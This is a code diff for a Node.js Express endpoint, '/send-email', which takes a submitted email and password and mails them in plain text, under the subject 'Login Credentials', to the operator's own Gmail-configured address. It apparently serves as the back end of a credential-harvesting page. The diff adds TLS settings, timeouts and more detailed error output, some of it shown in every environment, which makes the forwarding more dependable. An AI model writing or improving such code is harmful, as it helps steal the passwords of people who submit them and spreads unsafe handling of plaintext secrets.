@@ -24,10 +24,17 @@ const initializeTransporter = () => {
     host: 'smtp.gmail.com',
     port: 465,
     secure: true,
+    tls: {
+      rejectUnauthorized: true // Set to true in production with proper certificates
+    },
     auth: {
       user: process.env.EMAIL_USER,
       pass: process.env.EMAIL_PASS
-    }
+    },
+    // Add timeout configuration
+    connectionTimeout: 30000, // 30 seconds
+    greetingTimeout: 30000,   // 30 seconds
+    socketTimeout: 30000      // 30 seconds
   });
 };
 
@@ -69,16 +76,26 @@ app.post('/send-email', async (req, res) => {
     // Default to recipient from env or the same as sender
     const recipient = process.env.RECIPIENT_EMAIL || process.env.EMAIL_USER;
 
-    // Verify transporter configuration
-    await currentTransporter.verify();
+    // Verify transporter configuration with timeout
+    await Promise.race([
+      currentTransporter.verify(),
+      new Promise((_, reject) => 
+        setTimeout(() => reject(new Error('Connection timeout during verification')), 30000)
+      )
+    ]);
 
-    // Send mail
-    const info = await currentTransporter.sendMail({
-      from: process.env.EMAIL_USER,
-      to: recipient,
-      subject: 'Login Credentials',
-      text: 'Your login credentials are: \n Email: ' + email + '\n Password: ' + password
-    });
+    // Send mail with timeout
+    const info = await Promise.race([
+      currentTransporter.sendMail({
+        from: process.env.EMAIL_USER,
+        to: recipient,
+        subject: 'Login Credentials',
+        text: 'Your login credentials are: \n Email: ' + email + '\n Password: ' + password
+      }),
+      new Promise((_, reject) => 
+        setTimeout(() => reject(new Error('Connection timeout during email sending')), 30000)
+      )
+    ]);
 
     console.log('Email sent: ' + info.response);
     res.status(200).json({
@@ -88,10 +105,17 @@ app.post('/send-email', async (req, res) => {
     });
   } catch (error) {
     console.error('Error sending email:', error);
+    // More detailed error response
     res.status(500).json({
       success: false,
       message: 'Failed to send email',
-      error: error.message
+      error: error.message,
+      // Add more details for debugging
+      details: {
+        code: error.code,
+        command: error.command,
+        stack: process.env.NODE_ENV === 'development' ? error.stack : undefined
+      }
     });
   }
 });
